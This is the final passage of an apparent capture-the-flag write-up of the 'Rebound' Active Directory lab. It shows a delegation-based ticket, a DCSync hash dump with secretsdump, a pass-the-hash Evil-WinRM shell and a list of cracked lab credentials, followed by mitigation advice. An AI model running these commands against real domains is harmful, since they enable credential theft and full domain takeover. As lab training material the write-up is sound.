[*] Impersonating administrator
[*] Using additional ticket dc01@browser_dc01.rebound.htb@REBOUND.HTB.ccache instead of S4U2Self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@http_dc01.rebound.htb@REBOUND.HTB.ccache
```

**We now have a TGS for Administrator!**

**Attack Chain Summary:**

```
ldap_monitor → (RBCD) → delegator$ → (Constrained Delegation) → DC01$ as Administrator
```

***

### DCSync & Administrator Access

#### Understanding DCSync

**DCSync** is a technique that abuses the Directory Replication Service (DRS) protocol to:

* Simulate a Domain Controller
* Request password data from the actual DC
* Extract NTLM hashes and Kerberos keys for any user

**Requirements:**

* Valid authentication as a privileged account
* Our administrator TGS ticket allows this!

#### Dumping Administrator Hash

**Command:**

```bash
KRB5CCNAME=$(realpath administrator@http_dc01.rebound.htb@REBOUND.HTB.ccache) \
impacket-secretsdump dc01.rebound.htb -k -no-pass -just-dc-user administrator
```

**Output:**

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:176be138594933bb67db3b2572fc91b8:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:32fd2c37d71def86d7687c95c62395ffcbeaf13045d1779d6c0b95b056d5adb1
Administrator:aes128-cts-hmac-sha1-96:efc20229b67e032cba60e05a6c21431f
Administrator:des-cbc-md5:ad8ac2a825fe1080
[*] Cleaning up...
```

**SUCCESS! We have the Administrator's NTLM hash!**

```
Administrator:176be138594933bb67db3b2572fc91b8
```

#### Getting Administrator Shell

**Command:**

```bash
evil-winrm -i dc01.rebound.htb -u administrator -H 176be138594933bb67db3b2572fc91b8
```

**Output:**

```
Evil-WinRM shell v3.5

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
rebound\administrator

*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
DC01
```

**✅ DOMAIN COMPROMISED!**

#### Retrieving Flags

**User Flag:**

```powershell
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> type user.txt
[USER_FLAG_HERE]
```

**Root Flag:**

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
[ROOT_FLAG_HERE]
```

***

***

### Key Techniques Summary

| **Technique**             | **Tool**          | **Purpose**                                     |
| ------------------------- | ----------------- | ----------------------------------------------- |
| RID Cycling               | lookupsid.py      | Enumerate domain users without credentials      |
| ASREPRoasting             | GetNPUsers.py     | Attack users with no Kerberos pre-auth          |
| Kerberoasting w/o preauth | GetUserSPNs.py    | Extract service tickets without credentials     |
| Password Spraying         | netexec           | Identify password reuse across accounts         |
| ACL Abuse (AddSelf)       | bloodyAD          | Add user to privileged groups                   |
| ACL Abuse (GenericAll)    | dacledit          | Modify permissions on AD objects                |
| ForceChangePassword       | changepasswd.py   | Reset user passwords via ACL rights             |
| RemotePotato0             | RemotePotato0.exe | Capture NTLM hashes of logged-in users          |
| ReadGMSAPassword          | netexec           | Extract GMSA account passwords                  |
| RBCD                      | rbcd.py           | Configure resource-based constrained delegation |
| Constrained Delegation    | getST.py          | Impersonate users via delegation chains         |
| DCSync                    | secretsdump.py    | Replicate domain credentials from DC            |

***

### Lessons Learned

#### Security Misconfigurations Exploited

1. **Null Session Enabled**: Allowed RID cycling to enumerate users
2. **Pre-authentication Not Required**: jjones account enabled ASREPRoasting
3. **Weak Service Account Password**: ldap\_monitor password cracked easily
4. **Password Reuse**: Multiple accounts shared the same password
5. **Overly Permissive ACLs**: Users had excessive rights on groups and OUs
6. **GMSA Misconfiguration**: Unauthorized users could read GMSA passwords
7. **Delegation Chains**: Complex delegation paths led to full compromise

#### Mitigation Recommendations

1. **Disable Null Sessions**: Configure RestrictAnonymous registry key
2. **Enforce Pre-authentication**: Remove UF\_DONT\_REQUIRE\_PREAUTH flag from all accounts
3. **Strong Password Policy**: Enforce minimum 15-character passwords with complexity
4. **Eliminate Password Reuse**: Implement unique passwords per account
5. **Review ACLs Regularly**: Audit and remove excessive permissions
6. **Protect GMSA Accounts**: Restrict ReadGMSAPassword to minimal principals
7. **Limit Delegation**: Review and minimize constrained delegation configurations
8. **Enable Advanced Logging**: Monitor for Kerberoasting, DCSync, and delegation abuse
9. **Implement Tiering**: Separate administrative accounts from regular user accounts
10. **Use LAPS**: Implement Local Administrator Password Solution for local accounts

***

### Tools Used

* **RustScan**: Fast port scanning
* **NetExec**: SMB/LDAP enumeration and authentication
* **Impacket Suite**: Kerberos attacks and AD exploitation
  * GetNPUsers.py
  * GetUserSPNs.py
  * lookupsid.py
  * getST.py
  * secretsdump.py
  * dacledit.py
  * rbcd.py
  * changepasswd.py
  * findDelegation.py
* **BloodHound**: Active Directory attack path visualization
* **bloodyAD**: LDAP-based ACL manipulation
* **RemotePotato0**: NTLM hash capture
* **Evil-WinRM**: Windows Remote Management shell
* **Hashcat**: Password hash cracking

***

### Conclusion

Rebound demonstrated a complex Active Directory attack chain involving:

* **Kerberos exploitation** (ASREPRoasting, Kerberoasting without credentials)
* **ACL abuse** (AddSelf, GenericAll, ForceChangePassword)
* **Credential theft** (RemotePotato0, GMSA extraction)
* **Delegation attacks** (RBCD, Constrained Delegation)
* **Domain replication abuse** (DCSync)

The machine required understanding of advanced AD concepts and chaining multiple techniques together. Each step built upon the previous one, ultimately leading to full domain compromise.

**Final Credentials:**

```
ldap_monitor:1GR8t@$4u
oorend:1GR8t@$4u
winrm_svc:newPassword1
tbrady:543BOMBOMBUNmanda
delegator$:efe28bfe352b1f1245dbe26bef97f510
Administrator:176be138594933bb67db3b2572fc91b8
```

***

<figure><img src="../../../../.gitbook/assets/complete (36).gif" alt=""><figcaption></figcaption></figure>
